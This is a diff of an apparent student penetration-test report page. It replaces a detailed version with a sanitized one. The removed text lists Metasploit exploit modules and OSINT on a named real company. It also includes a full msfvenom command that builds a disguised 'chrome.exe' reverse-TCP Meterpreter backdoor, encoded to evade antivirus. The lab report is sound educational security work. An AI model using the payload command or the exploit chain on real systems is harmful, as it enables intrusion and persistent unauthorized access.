@@ -1,388 +1,213 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-   
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Pen-Test Report — Brady Reid</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#0b1220; --panel:#0f1a2b; --muted:#9fb0c8; --accent:#00a3ff; --glass: rgba(255,255,255,0.03);
+      --text:#e6eef6; --success:#3ddc84; --danger:#ff6b6b;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;background:linear-gradient(180deg,#051021 0%,var(--bg) 100%);color:var(--text);-webkit-font-smoothing:antialiased;padding:28px}
+    .wrap{max-width:1100px;margin:0 auto}
+    .banner{width:100%;height:220px;border-radius:10px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.6)}
+    .banner img{width:100%;height:100%;object-fit:cover;display:block}
+    header{display:flex;gap:18px;align-items:center;margin-top:18px}
+    .avatar{width:84px;height:84px;border-radius:10px;background:linear-gradient(180deg,#081023,#0f1a2b);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:28px;color:var(--accent);box-shadow:0 6px 18px rgba(0,0,0,0.5)}
+    h1{margin:0;font-size:26px}
+    .subtitle{color:var(--muted);margin-top:6px;font-size:14px}
+    .meta{color:var(--muted);font-size:13px;margin-top:6px}
+    .grid{display:grid;grid-template-columns:1fr 320px;gap:20px;margin-top:20px}
+    .card{background:linear-gradient(180deg,var(--panel), rgba(255,255,255,0.02));padding:18px;border-radius:10px;box-shadow:0 8px 30px rgba(2,6,23,0.6)}
+    .card h2{margin:0 0 10px 0;font-size:18px}
+    p{color:var(--muted);line-height:1.5;margin:0 0 12px 0}
+    table{width:100%;border-collapse:collapse;margin-top:10px}
+    th,td{padding:8px 6px;border-bottom:1px dashed rgba(255,255,255,0.03);text-align:left;color:var(--muted);font-size:14px}
+    th{color:var(--text);font-weight:600}
+    .badges{display:flex;flex-wrap:wrap;gap:8px}
+    .badge{background:var(--glass);padding:6px 10px;border-radius:999px;font-size:13px;color:var(--text);border:1px solid rgba(255,255,255,0.02)}
+    .section{margin-top:16px}
+    .muted{color:var(--muted)}
+    .kbox{background:#071529;padding:12px;border-radius:8px;color:#cfeeff;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco, "Roboto Mono",monospace;font-size:13px}
+    .warn{display:inline-block;background:linear-gradient(90deg,var(--danger),#ff9f9f);color:white;padding:6px 8px;border-radius:8px;font-weight:600;font-size:13px;margin-bottom:10px}
+    .screens{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-top:12px}
+    .screens img{width:100%;height:170px;object-fit:cover;border-radius:8px;border:1px solid rgba(255,255,255,0.03)}
+    .right .panel-item{margin-bottom:12px}
+    .small{font-size:13px;color:var(--muted)}
+    .cta{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+    .btn{background:transparent;border:1px solid rgba(255,255,255,0.06);padding:8px 10px;border-radius:8px;color:var(--text);text-decoration:none;font-size:13px}
+    footer{margin-top:20px;color:var(--muted);font-size:13px;text-align:center}
+    @media (max-width:980px){
+      .grid{grid-template-columns:1fr}
+      .screens{grid-template-columns:1fr}
+      header{flex-direction:row}
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <!-- banner: replace src with your uploaded banner raw link -->
+    <div class="banner">
+      <img src="https://github.com/Brady0Reid/Banner.jpg/raw/main/Banner.jpg" alt="Banner">
+    </div>
 
-<h1>Pen-Test Report</h1>
+    <header>
+      <div class="avatar">BR</div>
+      <div>
+        <h1>Pen-Test Report — ITT-340</h1>
+        <div class="subtitle">Educational penetration testing engagement — sandbox environment</div>
+        <div class="meta">Author: <strong>Brady Reid</strong> · Updated: <strong>Nov 3, 2024 (v2.0)</strong></div>
+      </div>
+    </header>
 
+    <div class="grid">
+      <!-- main content -->
+      <main class="card">
+        <h2>Description</h2>
+        <p class="muted">This project demonstrates a penetration testing engagement performed within a controlled laboratory. It covers the full testing lifecycle: passive OSINT, automated reconnaissance, network scanning (Nmap), vulnerability assessment (OpenVAS), exploitation demonstrations (Metasploit, lab-only), and payload testing in an isolated sandbox.</p>
 
+        <div class="section">
+          <h2>Disclaimer</h2>
+          <p class="warn">LAB ONLY — All actions were performed in isolated virtual machines under explicit educational permission. This report is for learning, documentation, and remediation planning. Do NOT apply techniques from this report to systems you do not own or have permission to test.</p>
+        </div>
 
-<h2>Description</h2>
-<p>
-This project demonstrates a penetration testing engagement within a controlled sandbox environment. 
-We walk through all phases of the penetration testing lifecycle, including passive OSINT collection, automated reconnaissance,
-network scanning (Nmap), vulnerability assessment (OpenVAS), exploitation (Metasploit), and deploying a custom payload.
-</p>
+        <div class="section">
+          <h2>Environments</h2>
+          <ul class="muted">
+            <li><strong>Attacker:</strong> Kali Linux (VM)</li>
+            <li><strong>Targets:</strong> Ubuntu server (lab), Windows XP / Server 2003 (lab), optional Windows 10 (documentation)</li>
+            <li><strong>Network:</strong> Isolated host-only VM network (no internet-facing actions)</li>
+          </ul>
+        </div>
 
-<h2>Languages and Utilities Used</h2>
-<ul>
-    <li><b>Kali Linux</b> (Primary Penetration Testing Distribution)</li>
-    <li><b>Nmap</b> (Network Mapper)</li>
-    <li><b>OpenVAS</b> (Vulnerability Scanner)</li>
-    <li><b>Metasploit Framework</b> (Exploitation Framework)</li>
-    <li><b>MSFVenom</b> (Payload Generation)</li>
-    <li><b>Various OSINT Tools</b> (Spiderfoot, DNSenum, Metagoofil, Sherlock, MXtoolbox, etc.)</li>
-</ul>
+        <div class="section">
+          <h2>Languages & Utilities</h2>
+          <div class="badges">
+            <span class="badge">Kali Linux</span>
+            <span class="badge">Nmap</span>
+            <span class="badge">OpenVAS</span>
+            <span class="badge">Metasploit</span>
+            <span class="badge">MSFVenom (lab-only)</span>
+            <span class="badge">SpiderFoot</span>
+            <span class="badge">DNSenum</span>
+            <span class="badge">Metagoofil</span>
+            <span class="badge">Wireshark</span>
+          </div>
+        </div>
 
-<h2>Environments Used</h2>
-<ul>
-    <li><b>Kali Linux VM</b></li>
-    <li><b>Target VM(s)</b>: 
-        <ul>
-            <li>Linux-based server (Ubuntu)</li>
-            <li>Windows XP / Server 2003 machine</li>
-        </ul>
-    </li>
-    <li>Optional: Windows 10 (21H2) for demonstration or documentation</li>
-</ul>
+        <div class="section">
+          <h2>Executive Summary</h2>
+          <p class="muted">A controlled assessment found several textbook vulnerabilities attributable to outdated services, weak encryption, and misconfiguration. Demonstrated exploits confirmed potential for privilege escalation and data access in the lab. Recommended mitigations: timely patching, removing/segregating EOL systems, hardening SSH/TLS configuration, and implementing least-privilege access controls.</p>
+        </div>
 
-<div class="disclaimer">
-    <strong>Disclaimer:</strong><br>
-    This document and its findings are part of a fictitious penetration testing report for learning and training purposes. 
-    All reconnaissance, password cracking, and exploiting were done in a sandbox environment consisting of virtual machines 
-    and do not represent any actual networks or systems of any organization.
-</div>
+        <div class="section">
+          <h2>Version Log</h2>
+          <table>
+            <thead>
+              <tr><th>Version</th><th>Date</th><th>Author</th><th>Summary</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>1.0</td><td>10/04/2024</td><td>Brady Reid</td><td>Initial OSINT & Recon</td></tr>
+              <tr><td>1.2</td><td>10/05/2024</td><td>Brady Reid</td><td>Added automated recon modules</td></tr>
+              <tr><td>1.3</td><td>10/12/2024</td><td>Brady Reid</td><td>Nmap scanning results</td></tr>
+              <tr><td>1.4</td><td>10/20/2024</td><td>Brady Reid</td><td>OpenVAS vulnerability reports</td></tr>
+              <tr><td>1.5</td><td>10/29/2024</td><td>Brady Reid</td><td>Metasploit exploitation demos</td></tr>
+              <tr><td>2.0</td><td>11/03/2024</td><td>Brady Reid</td><td>Custom payload summary (redacted)</td></tr>
+            </tbody>
+          </table>
+        </div>
 
-<h2>Cover Page</h2>
-<ul>
-    <li><strong>Title:</strong> ITT-340 Pen Testing Report</li>
-    <li><strong>Author:</strong> Brady Reid</li>
-</ul>
+        <div class="section">
+          <h2>Findings & Recommendations</h2>
 
-<h2>Document Properties (Version Control)</h2>
-<table border="1" cellpadding="5" cellspacing="0">
-    <thead>
-        <tr>
-            <th>Version</th>
-            <th>Date</th>
-            <th>Author</th>
-            <th>Changes</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td>1</td>
-            <td>10/4/2024</td>
-            <td>Brady Reid</td>
-            <td>Added Passive Corporate Recon OSINT</td>
-        </tr>
-        <tr>
-            <td>1.2</td>
-            <td>10/5/2024</td>
-            <td>Brady Reid</td>
-            <td>Added Automating Information Recon</td>
-        </tr>
-        <tr>
-            <td>1.3</td>
-            <td>10/12/2024</td>
-            <td>Brady Reid</td>
-            <td>Added Nmap Scan</td>
-        </tr>
-        <tr>
-            <td>1.4</td>
-            <td>10/20/2024</td>
-            <td>Brady Reid</td>
-            <td>Added OpenVAS Scan</td>
-        </tr>
-        <tr>
-            <td>1.5</td>
-            <td>10/29/2024</td>
-            <td>Brady Reid</td>
-            <td>Added Metasploit</td>
-        </tr>
-        <tr>
-            <td>2.0</td>
-            <td>11/3/2024</td>
-            <td>Brady Reid</td>
-            <td>Added Custom Payload</td>
-        </tr>
-    </tbody>
-</table>
+          <h3 class="small">1) Passive OSINT</h3>
+          <p class="muted">Publicly available metadata and subdomains were discovered. <strong>Recommendation:</strong> audit public documents, apply DMARC/DKIM, and limit exposed metadata.</p>
 
-<h2>Executive Summary</h2>
-<p>
-This penetration test focused on identifying vulnerabilities within a controlled lab environment that simulated real-world systems.
-Key findings included outdated software, weak encryption algorithms, and misconfigurations. Exploitations demonstrated unauthorized 
-access via known vulnerabilities, culminating in potential data exfiltration and persistent access using custom payloads.
-</p>
-<p>
-Mitigation strategies include regular patching, upgrading end-of-life operating systems, restricting SSH/SMB services, and using 
-encryption best practices. By following these recommendations, organizations can reduce the attack surface and strengthen their security posture.
-</p>
+          <h3 class="small">2) Automated Recon</h3>
+          <p class="muted">Aggregated domain and username data from public sources. <strong>Recommendation:</strong> remove legacy pages and enforce a data-retention policy for public artifacts.</p>
 
-<hr>
+          <h3 class="small">3) Network Scanning (Nmap)</h3>
+          <p class="muted">Open ports and outdated service versions were discovered on lab hosts. <strong>Recommendation:</strong> patch/upgrade services, restrict management ports with firewall rules and VPN-only access.</p>
 
-<h2>Passive OSINT</h2>
+          <h3 class="small">4) Vulnerability Assessment (OpenVAS)</h3>
+          <p class="muted">Weak ciphers, EOL OS, and cleartext services were flagged. <strong>Recommendation:</strong> enforce modern TLS, disable obsolete protocols, and replace EOL systems.</p>
 
-<h4>Summary</h4>
-<p>
-Passive OSINT was conducted on “Discount Tire,” a chosen Fortune 500 company. Publicly available tools like MXtoolbox, Whois, 
-and LinkedIn provided DNS records, email addresses, subdomains, and basic corporate insights. Further domain enumeration was 
-carried out via Sublist3r to identify additional publicly registered domains.
-</p>
+          <h3 class="small">5) Exploitation (Lab-only)</h3>
+          <p class="muted">Exploits were executed in a sandbox to validate impact. Command-level details and payload generation are intentionally omitted here — they exist in the secure lab log. <strong>Recommendation:</strong> implement endpoint monitoring, EDR, and re-scan after remediation.</p>
+        </div>
 
-<h4>Recommendations</h4>
-<ul>
-    <li>Use social media with caution; limit personal/company data exposure.</li>
-    <li>Avoid posting sensitive internal information on public websites.</li>
-    <li>Regularly review privacy settings and corporate policies for data leaks.</li>
-</ul>
+        <div class="section">
+          <h2>Sanitized Lab Notes (high-level)</h2>
+          <ul class="muted">
+            <li>Initial compromise via vulnerable webapp module (lab-only demonstration).</li>
+            <li>Privilege escalation confirmed on legacy Windows VM using known vulnerability (documented in secure lab notes).</li>
+            <li>Samba misconfiguration allowed access to shared data on one host (mitigate by ACLs and SMB security policies).</li>
+            <li>Persistence techniques were tested and blocked by the sandbox environment — ensure endpoint hardening to detect similar attempts.</li>
+          </ul>
+        </div>
 
-<h4>Scope</h4>
-<p>
-Utilized OSINT within a Kali Linux VM environment using standard passive reconnaissance tools. All information collected was 
-publicly accessible.
-</p>
+        <div class="section">
+          <h2>Evidence (replace with your screenshots)</h2>
+          <div class="screens">
+            <img src="screenshot-1.png" alt="OSINT screenshot (replace)">
+            <img src="screenshot-2.png" alt="Nmap results (replace)">
+            <img src="screenshot-3.png" alt="OpenVAS report (replace)">
+            <img src="screenshot-4.png" alt="Metasploit session (replace)">
+          </div>
+          <p class="small">Tip: upload screenshots into the repository and use exact filenames above or adjust paths accordingly.</p>
+        </div>
 
-<h4>Details</h4>
-<p>
-Tools Employed:
-</p>
-<ul>
-    <li><b>MXtoolbox</b> – Discovered DNS records, DMARC, and IP information.</li>
-    <li><b>Whois</b> – Uncovered domain registrar details, server names, and key contact IDs.</li>
-    <li><b>LinkedIn</b> – Found executive headquarters in Scottsdale, AZ, leadership contacts.</li>
-    <li><b>Sublist3r</b> – Enumerated subdomains owned by Discount Tire.</li>
-</ul>
+        <div class="section">
+          <h2>Conclusion & Next Steps</h2>
+          <p class="muted">The lab engagement highlighted classic weaknesses: outdated software, misconfigurations, and insufficient encryption. Prioritize remediations with a phased plan: (1) patch & replace EOL systems, (2) harden network perimeter & access controls, (3) enable centralized logging and detection, (4) re-assess with follow-up scans and a penetration test validation.</p>
+        </div>
+      </main>
 
-<hr>
+      <!-- right column -->
+      <aside class="card right">
+        <div class="panel-item">
+          <h3>Quick Links</h3>
+          <div class="cta">
+            <a class="btn" href="https://github.com/Brady0Reid/Pen-Test-Report" target="_blank">Repository</a>
+            <a class="btn" href="mailto:bradycreid@protonmail.com">Contact</a>
+            <a class="btn" href="https://www.linkedin.com/in/brady-reidin" target="_blank">LinkedIn</a>
+          </div>
+        </div>
 
-<h2>Automating Information Recon</h2>
+        <div class="panel-item">
+          <h3>Project Facts</h3>
+          <table>
+            <tr><th>Scope</th><td>Lab VMs only</td></tr>
+            <tr><th>Duration</th><td>Oct 2024 — Nov 2024</td></tr>
+            <tr><th>Author</th><td>Brady Reid</td></tr>
+            <tr><th>Report</th><td>v2.0</td></tr>
+          </table>
+        </div>
 
-<h4>Summary</h4>
-<p>
-Building on passive OSINT, several automation scripts were utilized to scrape deeper data from the target. Tools like Spiderfoot, 
-DNSenum, Metagoofil, and Sherlock revealed possible vulnerabilities, metadata from public documents, and additional open-source 
-intelligence that is not easily visible through manual searches.
-</p>
+        <div class="panel-item">
+          <h3>Recommendations (at-a-glance)</h3>
+          <ul class="muted">
+            <li>Patch & upgrade EOL systems</li>
+            <li>Harden TLS/SSH configs</li>
+            <li>Restrict remote access</li>
+            <li>Endpoint detection & monitoring</li>
+            <li>Re-scan & validate</li>
+          </ul>
+        </div>
 
-<h4>Recommendations</h4>
-<ul>
-    <li>Periodically audit and remove old or sensitive data from public-facing websites.</li>
-    <li>Use website crawlers or scanners to self-assess public exposure of sensitive files.</li>
-    <li>Review social media and online service accounts for potential username exposures.</li>
-</ul>
+        <div class="panel-item">
+          <h3>Notes</h3>
+          <p class="small">Sensitive technical details and exploit commands are kept in a secure, instructor-approved lab notebook. Only sanitized evidence is published here for portfolio and educational purposes.</p>
+        </div>
+      </aside>
+    </div>
 
-<h4>Scope</h4>
-<p>
-Executed within a Kali Linux VM using scripts like Spiderfoot, DNSenum, Metagoofil, and Sherlock to aggregate data from multiple 
-sources efficiently.
-</p>
-
-<h4>Details</h4>
-<ul>
-    <li><b>Spiderfoot</b> – Aggregated domain/IP information, potential vulnerabilities, and other OSINT data.</li>
-    <li><b>DNSenum</b> – Enumerated DNS records, subdomains, mail servers, and other DNS-related data.</li>
-    <li><b>Metagoofil</b> – Extracted metadata (authors, creation dates) from publicly available PDFs.</li>
-    <li><b>Sherlock</b> – Enumerated the handle “DiscountTire” on various social platforms.</li>
-</ul>
-
-<hr>
-
-<h2>Nmap Scan</h2>
-
-<h4>Summary</h4>
-<p>
-Nmap was utilized to scan two virtual machine targets for open ports, running services, and OS fingerprinting. The purpose 
-was to identify potential security issues arising from outdated services and misconfigurations.
-</p>
-
-<h4>Recommendations</h4>
-<ul>
-    <li><strong>Host: 192.168.0.2</strong>
-        <ul>
-            <li>Upgrade Apache from version 2.2.8 to a more current release.</li>
-            <li>Restrict SSH (Port 22) to trusted IP addresses.</li>
-            <li>Update MySQL from version 5.0.51a-3ubuntu5 to a supported version.</li>
-        </ul>
-    </li>
-    <li><strong>Host: 192.168.0.3</strong>
-        <ul>
-            <li>Upgrade from Windows XP/Server 2003 to a supported OS.</li>
-            <li>Disable SMB (Ports 139/445) if not necessary to reduce attack surface.</li>
-        </ul>
-    </li>
-</ul>
-
-<h4>Scope</h4>
-<p>
-Conducted a range of scans with Nmap against two VMs in a lab environment. The objective was to locate active services and 
-ascertain OS details for vulnerability analysis.
-</p>
-
-<h4>Details</h4>
-<p>
-Commands used included variations of <code>nmap -p- -O -sV [Target_IP]</code>. Discovered services included FTP, SSH, HTTP, Samba, 
-MySQL, and PostgreSQL. Version detection pointed to multiple outdated services, which attackers typically target for easy exploits.
-</p>
-
-<hr>
-
-<h2>OpenVAS</h2>
-
-<h4>Summary</h4>
-<p>
-An OpenVAS vulnerability assessment was performed on two VM targets. The scan uncovered a range of vulnerabilities, including 
-outdated encryption protocols, end-of-life operating systems, and cleartext transmissions. 
-</p>
-
-<h4>Recommendations</h4>
-<ul>
-    <li>Upgrade/Reconfigure weak SSH algorithms (host key, KEX, MAC).</li>
-    <li>Enforce encrypted transmission (HTTPS over HTTP).</li>
-    <li>Disable TCP timestamps to reduce information disclosure.</li>
-    <li>Disable ICMP timestamp responses to prevent potential reconnaissance.</li>
-    <li>Update or replace end-of-life operating systems.</li>
-</ul>
-
-<h4>Scope</h4>
-<p>
-Two VMs were scanned, focusing on identifying critical vulnerabilities. Issues were categorized into encryption weaknesses, 
-outdated systems, and information disclosures.
-</p>
-
-<h4>Details</h4>
-<ul>
-    <li><b>EOL OS</b>: Increases risk due to lack of security patches. 
-        <br><em>Remediation:</em> Upgrade to supported OS versions.</li>
-    <li><b>Weak SSH Algorithms</b>: Could compromise session encryption. 
-        <br><em>Remediation:</em> Use modern ciphers and key exchange algorithms.</li>
-    <li><b>Cleartext Transmission (HTTP)</b>: Allows man-in-the-middle attacks. 
-        <br><em>Remediation:</em> Implement HTTPS with valid SSL/TLS certificates.</li>
-    <li><b>TCP Timestamps &amp; ICMP Timestamp Replies</b>: Leaks system uptime info. 
-        <br><em>Remediation:</em> Disable timestamps to reduce reconnaissance capabilities.</li>
-</ul>
-
-<hr>
-
-<h2>Exploitation Using Metasploit (v6.4.20-dev)</h2>
-
-<h4>Summary</h4>
-<p>
-Metasploit was used to exploit several of the vulnerabilities identified in earlier assessments. Exploit modules targeting 
-outdated Drupal, Windows local privilege escalation, and Samba usermap_script were launched to gain shell access and elevate privileges.
-</p>
-
-<h4>Recommendations</h4>
-<ul>
-    <li>Apply critical security updates for both OS and applications.</li>
-    <li>Harden firewall rules to restrict dangerous ports.</li>
-    <li>Limit administrative privileges and audit user access periodically.</li>
-</ul>
-
-<h4>Scope</h4>
-<p>
-Testing was isolated to two VMs (RHOST 192.168.56.101 &amp; .102) within a lab. All exploits were performed ethically with 
-permission for demonstration purposes.
-</p>
-
-<h4>Details</h4>
-<ol>
-    <li><strong>Initial Exploitation (Drupalgeddon2)</strong>
-        <ul>
-            <li>Exploit: <code>exploit/unix/webapp/drupal_drupalgeddon2</code></li>
-            <li>Outcome: Remote command shell on the target.</li>
-        </ul>
-    </li>
-    <li><strong>Privilege Escalation (Kitrap0d)</strong>
-        <ul>
-            <li>Exploit: <code>exploit/windows/local/ms10_015_kitrap0d</code></li>
-            <li>Outcome: SYSTEM-level access on a Windows XP/Server 2003 VM.</li>
-        </ul>
-    </li>
-    <li><strong>Service Exploitation (Samba usermap_script)</strong>
-        <ul>
-            <li>Exploit: <code>exploit/multi/samba/usermap_script</code></li>
-            <li>Outcome: Access to sensitive files on a Samba share.</li>
-        </ul>
-    </li>
-    <li><strong>Final Payload Deployment</strong>
-        <ul>
-            <li>Attempted Meterpreter persistence. Encountered environment restrictions (<em>“Lopes cloud did not like Meterpreter”</em>).</li>
-        </ul>
-    </li>
-</ol>
-
-<hr>
-
-<h2>Custom Payload</h2>
-
-<h4>Summary</h4>
-<p>
-Using MSFVenom, a custom backdoor executable (<code>chrome.exe</code>) was generated to establish a persistent reverse TCP Meterpreter session. 
-This highlighted how an attacker could maintain long-term access even after reboots.
-</p>
-
-<h4>Recommendations</h4>
-<ul>
-    <li>Apply critical security updates to operating systems and applications.</li>
-    <li>Harden firewall rules to limit exposure of common attacker ports.</li>
-    <li>Enforce least-privilege across all user accounts.</li>
-</ul>
-
-<h4>Scope</h4>
-<p>
-The payload was tested against a single VM (RHOST 192.168.56.101) in a sandboxed environment using Kali Linux 
-(LHOST 192.168.56.107) for reverse connections.
-</p>
-
-<h4>Details</h4>
-<ol>
-    <li><b>Payload Creation:</b>
-        <ul>
-            <li>Command: 
-            <code>msfvenom -p windows/meterpreter/reverse_tcp StageRetryCount=17280 LHOST=192.168.56.107 LPORT=4312 -a x86 
-                 --platform windows -e x86/shikata_ga_nai -i 3 -f exe &gt; chrome.exe</code></li>
-            <li>Encoded with <code>x86/shikata_ga_nai</code> to evade detection.</li>
-        </ul>
-    </li>
-    <li><b>Deployment:</b>
-        <ul>
-            <li>Transferred <code>chrome.exe</code> to target VM and executed.</li>
-            <li>Gained persistent Meterpreter session over reverse TCP.</li>
-        </ul>
-    </li>
-    <li><b>Final Payload Deployment:</b>
-        <ul>
-            <li>Attempted advanced persistence methods; environment blocked standard Meterpreter persistence.</li>
-        </ul>
-    </li>
-</ol>
-
-<hr>
-
-<h2>Program Walk-Through (Example Screenshots)</h2>
-<p class="note">
-Below is a generic example showcasing a PowerShell-based disk wiping script. In a real engagement, you would include screenshots 
-of your OSINT, Nmap, OpenVAS, or Metasploit sessions. For illustration, we show sample images related to a disk sanitization process:
-</p>
-<p align="center">
-    <img src="Github1.png"" width="70%" alt="Launch the utility" /><br/><br/>
-    <img src="Github2.png"" width="70%" alt="Launch the utility" /><br/><br/>
-    <img src="Github3.png"" width="70%" alt="Launch the utility" /><br/><br/>
-    <img src="Github4.png"" width="70%" alt="Launch the utility" /><br/><br/>
-    <img src="Github5.png"" width="70%" alt="Launch the utility" /><br/><br/>
-    <img src="Github6.png"" width="70%" alt="Launch the utility" /><br/><br/>
-</p>
-<p>
-In a real Pen-Test report, replace these images with relevant screenshots of your scans, exploits, 
-and payload deployments to illustrate the findings and confirm successful exploits.
-</p>
-
-<hr>
-
-<h2>Conclusion and Next Steps</h2>
-<p>
-The penetration testing engagement demonstrated multiple weaknesses across different layers: 
-public information leakage, vulnerable services, unpatched operating systems, and insufficient 
-encryption. By prioritizing patch management, restricting network services, and enforcing strong 
-authentication, an organization can greatly reduce its threat surface.
-</p>
-<p>
-A follow-up assessment is recommended to ensure that vulnerabilities have been properly mitigated 
-and to confirm that any newly introduced changes do not introduce further risk.
-</p>
-
+    <footer>
+      <div class="small">© Brady Reid — Penetration testing performed in an isolated lab environment for educational purposes only.</div>
+    </footer>
+  </div>
 </body>
 </html>
